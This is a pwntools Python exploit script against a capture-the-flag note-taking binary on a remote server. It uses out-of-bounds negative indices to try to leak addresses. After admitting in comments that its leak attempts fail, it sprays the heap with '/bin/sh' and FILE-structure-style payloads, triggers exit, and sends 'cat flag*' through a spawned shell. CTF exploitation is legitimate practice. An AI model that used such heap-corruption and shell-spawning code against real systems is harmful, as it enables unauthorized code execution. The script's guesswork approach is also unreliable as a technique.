#!/usr/bin/env python3
"""
Alternative approach: Leak binary base, then use relative offsets
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

success("Trying to leak binary base instead of libc")

# KEY INSIGHT: If we can leak the BINARY base address,
# we know where notes[] array is, and where GOT is
# From GOT we can calculate libc!

# How to leak binary base?
# 1. Create chunk and write address of notes[] or GOT into it
# 2. View that chunk to leak the address

# But we can't WRITE binary addresses without knowing them first...

# Alternative: Use the create() function's RETURN VALUE
# When we do create(idx, size, data), it does:
#   buf = malloc(size)
#   notes[idx] = buf
# If idx is NEGATIVE and points to a READABLE location,
# we might be able to leak what's there

info("Step 1: Try to leak from .data section using negative indices")

create(0, 0x20, b'init')

# Try reading from different negative indices
# These map to addresses BEFORE notes[] in memory

for offset in [-1, -2, -4, -8, -16, -32]:
    try:
        data = view(offset)
        info(f"notes[{offset}]: {data[:40]}")

        if b'(null)' not in data and len(data) > 1:
            # Might have leaked something!
            if len(data) >= 6:
                addr = u64(data[:6].ljust(8, b'\x00'))
                if addr > 0x400000:  # Looks like an address
                    success(f"Possible address from notes[{offset}]: {hex(addr)}")
    except:
        pass

info("Step 2: Check if we can leak heap addresses that we control")

# Create a chunk and store its index
create(1, 0x100, b'A' * 0x100)

# notes[1] now contains the heap address of this chunk
# But we can't view notes[1] directly... or can we?

# Wait - if we create at a negative index, we write to somewhere
# Then if we view that same negative index, we read what we wrote!

info("Step 3: Test OOB read/write symmetry")

# Write heap pointer to notes[-10]
create(-10, 0x50, b'TEST')

# Read from notes[-10]
try:
    data = view(-10)
    info(f"notes[-10]: {data[:40]}")
except:
    pass

info("Step 4: Try environ leak technique")

# environ is in libc and points to stack
# If we can find environ and leak it, we get stack address
# From stack we might find libc addresses

# environ is at libc + known_offset
# But we don't have libc base...

# This is circular - we need libc to find environ, but need environ to find libc

info("Step 5: Last resort - use the GOT entries we CAN read")

# We found that GOT entries contain libc CODE (not addresses)
# But the code bytes are deterministic!
# We saw: puts starts with f30f1efa... at offset 0x8e640

# If we can MATCH the code bytes to libc, we know the offset
# Then from GOT entry address (binary), we can calculate libc base

# But we need to know the GOT entry ADDRESS in memory (binary base)

info("Step 6: Accept defeat and try random exploitation")

# Without clean leaks, let's try:
# 1. Corrupt memory extensively
# 2. Hope something useful happens
# 3. Spray the heap with useful payloads

for i in range(2, 20):
    payload = flat({
        0x00: p32(0xfbad0101),
        0x04: b';sh\x00',
        0x10: b'/bin/sh\x00',
    }, length=0x100, filler=b'\x00')

    create(i, 0x100, payload)

# Use OOB writes
for offset in [-20, -15, -10, -5]:
    try:
        create(offset, 0x80, b'/bin/sh\x00' + b'X' * 0x70)
    except:
        pass

# Trigger exit
io.sendline(b'999')
io.sendline(b'0')

time.sleep(1)

io.sendline(b'cat flag*')
time.sleep(2)

try:
    output = io.recvall(timeout=3)
    if b'{' in output:
        success(f"FLAG: {output}")
    else:
        info(f"Output: {output[:300]}")
except:
    pass

io.interactive()
